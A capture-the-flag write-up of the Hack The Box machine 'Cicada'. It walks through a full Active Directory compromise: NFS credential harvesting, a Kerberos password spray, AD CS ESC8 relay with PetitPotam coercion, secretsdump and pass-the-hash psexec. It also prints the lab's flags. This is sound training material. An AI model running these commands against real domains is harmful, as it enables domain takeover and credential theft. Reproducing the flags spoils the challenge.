Author: Faridd

### HTB Write-Up: Cicada

| Field      | Details                                                          |
|------------|------------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Cicada)      |
| Difficulty | Medium                                                            |
| OS         | Windows                                                           |
| Date       | November 07, 2026                                                 |

---

#### Table of Contents
1. [Reconnaissance — Rustscan & Nmap](#1-reconnaissance--rustscan--nmap)
2. [Enumeration — NTLM Disabled & NFS Share Discovery](#2-enumeration--ntlm-disabled--nfs-share-discovery)
3. [Credential Discovery — NFS Profile Harvesting & Password Leak](#3-credential-discovery--nfs-profile-harvesting--password-leak)
4. [Initial Access — Kerberos-Only Credential Spray](#4-initial-access--kerberos-only-credential-spray)
5. [Privilege Escalation — AD CS ESC8 via Kerberos Relay over SMB](#5-privilege-escalation--ad-cs-esc8-via-kerberos-relay-over-smb)
6. [Domain Compromise — Secretsdump & PsExec as Administrator](#6-domain-compromise--secretsdump--psexec-as-administrator)

---

#### 1. Reconnaissance — Rustscan & Nmap

```bash
rustscan -a 10.129.234.48 --ulimit=5000
```

**Open Ports:**

```
Open 10.129.234.48:53
Open 10.129.234.48:88
Open 10.129.234.48:80
Open 10.129.234.48:111
Open 10.129.234.48:135
Open 10.129.234.48:139
Open 10.129.234.48:389
Open 10.129.234.48:445
Open 10.129.234.48:464
Open 10.129.234.48:593
Open 10.129.234.48:636
Open 10.129.234.48:2049
Open 10.129.234.48:5985
Open 10.129.234.48:9389
```

```bash
nmap -sC -sV -p80,445,389,636,111,2049,5985 10.129.234.48
```

**Result (relevant extract):**

```
80/tcp   open  http          Microsoft IIS httpd 10.0
111/tcp  open  rpcbind       2-4 (RPC #100000)
|   100003  2,3,4       2049/tcp   nfs
|   100005  1,2,3       2049/tcp   mountd
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
445/tcp  open  microsoft-ds?
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl)
2049/tcp open  nlockmgr      1-4 (RPC #100021)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: DC-JPQ225; OS: Windows
```

This is a Domain Controller for `cicada.vl`, hostname **DC-JPQ225**. The standout here is **111/2049 (RPC/NFS)** — an unusual service pairing for a Windows DC and a strong signal that a share is exported, intentionally or not, to the network. The domain was added to `/etc/hosts`:

```bash
echo '10.129.234.48 DC-JPQ225.cicada.vl cicada.vl' | sudo tee -a /etc/hosts
```

---

#### 2. Enumeration — NTLM Disabled & NFS Share Discovery

##### 2.1 — SMB Access Attempts

```bash
netexec smb 10.129.234.48 -u "guest" -p "" --shares
netexec smb 10.129.234.48 -u "" -p "" --shares
```

**Result:**

```
[-] cicada.vl\guest: STATUS_NOT_SUPPORTED
[-] cicada.vl\: STATUS_NOT_SUPPORTED
[-] Error enumerating shares: STATUS_USER_SESSION_DELETED
```

The `STATUS_NOT_SUPPORTED` response (instead of a normal auth failure) combined with the `(NTLM:False)` flag in NetExec's banner confirms **NTLM authentication is disabled entirely** on this Domain Controller. NetExec defaults to NTLM when given a plaintext username/password over SMB, so the server rejects the attempt outright before even checking the credentials — this would be important later when attempting authentication.

##### 2.2 — NFS Share Discovery

With 2049 open, the exported NFS shares were checked directly:

```bash
showmount -e 10.129.234.48
```

**Result:**

```
Export list for 10.129.234.48:
/profiles (everyone)
```

A `/profiles` share is exported to **everyone**, with no host restriction — a significant misconfiguration on a domain controller.

##### 2.3 — Mounting the Share

```bash
sudo mkdir -p /mnt/profiles
sudo mount -t nfs 10.129.234.48:/profiles /mnt/profiles
```

```bash
cd /mnt/profiles
ls -laR
```

**Result:**

```
drwxrwxrwx+ 2 nobody nogroup   64 Sep 15  2024 Administrator
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 Daniel.Marshall
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 Debra.Wright
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 Jane.Carter
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 Jordan.Francis
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 Joyce.Andrews
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 Katie.Ward
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 Megan.Simpson
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 Richard.Gibbons
drwxrwxrwx+ 2 nobody nogroup   64 Sep 15  2024 Rosie.Powell
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 Shirley.West

./Administrator:
-rwxrwxrwx+ 1 nobody nogroup 1490573 Sep 13  2024 vacation.png

./Rosie.Powell:
-rwx------+ 1 nobody nogroup 1832505 Sep 13  2024 marketing.png
ls: cannot open directory './Rosie.Powell/Documents': Permission denied
```

This share contains one directory per domain user, with per-user profile pictures — `vacation.png` under Administrator was world-readable, but `marketing.png` under Rosie.Powell was not, due to NFS UID-based permissions.

---

#### 3. Credential Discovery — NFS Profile Harvesting & Password Leak

##### 3.1 — Extracting the Readable Images

```bash
sudo cp marketing.png ~/Downloads/VulnCicada
sudo cp vacation.png ~/Downloads/VulnCicada
```

The images couldn't be opened locally because their file ownership (via NFS UID mapping) didn't match the local user. Ownership was corrected to allow viewing:

```bash
sudo chown faridd:faridd vacation.png marketing.png
```

##### 3.2 — Password Leak in an Image

Opening `marketing.png` revealed a desktop note reading **`Cicada123`** — a plaintext password leaked through what looks like an onboarding/office photo. This, combined with the full list of usernames already visible as directory names on the NFS share, sets up a credential spray.

##### 3.3 — Building the Username List

```bash
cat users | awk '{print $9}' > users.txt
```

**Result:**

```
Administrator
Daniel.Marshall
Debra.Wright
Jane.Carter
Jordan.Francis
Joyce.Andrews
Katie.Ward
Megan.Simpson
Richard.Gibbons
Rosie.Powell
Shirley.West
```

---

#### 4. Initial Access — Kerberos-Only Credential Spray

##### 4.1 — First Spray Attempt (NTLM — Fails)

```bash
netexec smb 10.129.234.48 -u users.txt -p "Cicada123"
```

**Result:**

```
[-] cicada.vl\Administrator:Cicada123 STATUS_NOT_SUPPORTED
[-] cicada.vl\Daniel.Marshall:Cicada123 STATUS_NOT_SUPPORTED
... (all accounts)
```

As expected from the earlier NTLM-disabled finding, every attempt failed with `STATUS_NOT_SUPPORTED` rather than a real credential check — the authentication protocol itself was being rejected, not the password.

##### 4.2 — Retrying with Kerberos Authentication

```bash
netexec smb 10.129.234.48 -u users.txt -p "Cicada123" -k
```

**Result:**

```
[-] cicada.vl\Administrator:Cicada123 KDC_ERR_PREAUTH_FAILED
... 
[-] cicada.vl\Richard.Gibbons:Cicada123 KDC_ERR_PREAUTH_FAILED
[+] cicada.vl\Rosie.Powell:Cicada123
```

Switching to Kerberos (`-k`) authentication got past the NTLM block, and the credential spray succeeded for **Rosie.Powell:Cicada123**.

##### 4.3 — Requesting a TGT

```bash
impacket-getTGT cicada.vl/Rosie.Powell:'Cicada123'
export KRB5CCNAME=Rosie.Powell.ccache
klist
```

**Result:**

```
Ticket cache: FILE:Rosie.Powell.ccache
Default principal: Rosie.Powell@CICADA.VL

Valid starting       Expires              Service principal
11/07/2026 14:21:19  11/08/2026 00:21:19  krbtgt/CICADA.VL@CICADA.VL
```

A valid Kerberos ticket-granting ticket was obtained and cached for `Rosie.Powell`, enabling authenticated, Kerberos-based access to the domain going forward.

##### 4.4 — Browsing SMB via Kerberos

```bash
impacket-smbclient -k DC-JPQ225.cicada.vl
```

The `Profiles$` share mirrored the same content already pulled via NFS. More significantly, a **`CertEnroll`** share was also present, holding certificate templates — a strong indicator that **Active Directory Certificate Services (AD CS)** is deployed on this domain, opening up certificate-based attack paths.

---

#### 5. Privilege Escalation — AD CS ESC8 via Kerberos Relay over SMB

##### 5.1 — Checking for AD CS Misconfigurations

```bash
certipy-ad find -target DC-JPQ225.cicada.vl -u Rosie.Powell@cicada.vl -p Cicada123 -k -vulnerable -stdout
```

No certificate templates were individually vulnerable, but the **Certificate Authority itself was flagged for ESC8** — HTTP(S) Web Enrollment is enabled without protections against NTLM/Kerberos relay, meaning a coerced machine authentication can be relayed straight to the enrollment endpoint to obtain a certificate for that machine.

Two routes exist for this attack: from a domain-joined Windows host using [RemoteKrbRelay](https://github.com/CICADA8-Research/RemoteKrbRelay) (automates coercion + relay), or entirely from Linux using the Kerberos-relay-over-SMB technique documented by [Synacktiv](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx.html). The Linux route was used here to avoid standing up a Windows box for this single step.

##### 5.2 — Planting a Malicious DNS Record

The attack starts by creating a DNS record on the domain that resolves to the attacker's IP, so the DC can be coerced into authenticating back to it via a crafted SPN:

```bash
bloodyad -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.15.112
```

##### 5.3 — Starting the Certipy Relay Listener

```bash
certipy-ad relay -target 'http://dc-jpq225.cicada.vl/' -template DomainController -subject CN=DC-JPQ225,CN=Computer,DC=cicada,DC=vl
```

This listens on SMB and, once it catches an incoming Kerberos authentication, relays it to the AD CS web enrollment endpoint to request a certificate for the `DomainController` template.

##### 5.4 — Checking Coercion Methods

```bash
netexec smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k -M coerce_plus
```

Several coercion methods were reported viable against the target.

##### 5.5 — Triggering Coercion with PetitPotam

**PetitPotam** was chosen as the most reliable method in practice, forcing the DC to authenticate back to the attacker-controlled listener:

```bash
netexec smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
```

As soon as coercion fired, the relay listener caught the DC's Kerberos authentication and completed the certificate request — resulting in a certificate valid for authenticating as the **`DC-JPQ225`** machine account.

##### 5.6 — Converting the Certificate to a TGT

```bash
certipy-ad auth -pfx dc-jpq225.pfx -dc-ip 10.129.63.169
```

This returned both a Kerberos TGT and the NTLM hash for the `DC-JPQ225$` machine account.

---

#### 6. Domain Compromise — Secretsdump & PsExec as Administrator

##### 6.1 — Extracting the Administrator Hash

The machine account itself can't be used for an interactive logon, but its TGT has enough privilege (as a Domain Controller account) to pull secrets via DCSync-style extraction:

```bash
KRB5CCNAME=dc-jpq225.ccache impacket-secretsdump -k -no-pass cicada.vl/dc-jpq225\$@dc-jpq225.cicada.vl -just-dc-user administrator
```

NetExec was used to confirm the recovered hash was valid for `administrator`.

##### 6.2 — Shell as SYSTEM via PsExec Pass-the-Hash

```bash
impacket-psexec cicada.vl/administrator@DC-JPQ225.cicada.vl -k -hashes :85a0da53871a9d56b6cd05deda3a5e87
```

**Result:**

```
[*] Found writable share ADMIN$
[*] Uploading file AJtTmlXm.exe
[*] Creating service YPFl on DC-JPQ225.cicada.vl.....
[*] Starting service YPFl.....

C:\Windows\system32> whoami
nt authority\system
```

##### 6.3 — User & Root Flags

```cmd
C:\Windows\system32> type C:\Users\Administrator\Desktop\user.txt
128b284bdd5bf68de8b7b67a43ce12b8

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
909402637982e0085b8697e2e756cc20
```
